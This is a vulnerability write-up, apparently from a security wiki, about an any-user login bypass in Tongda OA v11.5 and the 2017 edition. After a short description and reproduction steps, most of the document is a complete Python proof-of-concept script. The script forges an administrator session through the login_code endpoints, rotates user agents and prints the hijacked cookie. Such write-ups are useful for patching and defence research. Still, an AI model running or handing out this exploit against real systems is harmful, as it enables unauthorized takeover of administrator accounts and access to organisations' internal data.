# Tongda OA v11.5 login_code.php Any user login

## Vulnerability Description

Tongda OA is an office system. 
This vulnerability type is forged by any user, and unauthorized remote attackers can use carefully constructed request packets to make logins for any user.

## Affect Version

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Tongda OA 2017 edition</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Tongda OA version V11.X < V11.5</span>

## Environment construction

Vulnerability environment download

```plain
https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe
```

Double-click to install

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-1.png)



## Vulnerability reappears

Use [POC](https://github.com/NS-Sp4ce/TongDaOA-Fake-User/blob/master/POC.py) to get the administrator's cookies

```plain
root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx
[+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/
```

Successfully obtained cookies, add cookie access

```
/general/index.php?isIE=0&modify_pwd=0
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tongdaoa-2.png)



## Vulnerability POC

```python
'''
@Author         : Sp4ce
@Date           : 2020-03-17 23:42:16
LastEditors    : Sp4ce
LastEditTime   : 2020-08-27 10:21:44
@Description    : Challenge Everything.
'''
import requests
from random import choice
import argparse
import json

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
]

headers={}

def getV11Session(url):
    checkUrl = url+'/general/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = url+'/logincheck_code.php'
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
        tmp_cookie = res.headers['Set-Cookie']
        headers["User-Agent"] = choice(USER_AGENTS)
        headers["Cookie"] = tmp_cookie
        check_available = requests.get(url + '/general/index.php',headers=headers)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                print('[+]Get Available COOKIE:' + tmp_cookie)
        else:
            print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
    except:
        print('[-]Something Wrong With '+url)



def get2017Session(url):
    checkUrl = url+'/ispirit/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = json.loads(res.text)
        codeUid = resText['codeuid']
        codeScanUrl = url+'/general/login_code_scan.php'
        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
        resText = json.loads(res.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
            res = requests.get(getCodeUidUrl)
            tmp_cookie = res.headers['Set-Cookie']
            headers["User-Agent"] = choice(USER_AGENTS)
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(url + '/general/index.php',headers=headers)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print('[+]Get Available COOKIE:' + tmp_cookie)
            else:
                print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
        else:
            print('[-]Something Wrong With '+url  + ' Maybe Not Vulnerable ?')
    except:
        print('[-]Something Wrong With '+url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-v",
        "--tdoaversion",
        type=int,
        choices=[11, 2017],
        help="Target TongDa OA Version. e.g: -v 11、-v 2017")
    parser.add_argument(
        "-url",
        "--targeturl",
        type=str,
        help="Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1"
    )
    args = parser.parse_args()
    url = args.targeturl
    if 'http://' not in url:
        url = 'http://' + url
    if args.tdoaversion == 11:
        getV11Session(url)
    elif args.tdoaversion == 2017:
        get2017Session(url)
    else:
        parser.print_help()
```



If you gain something, just like it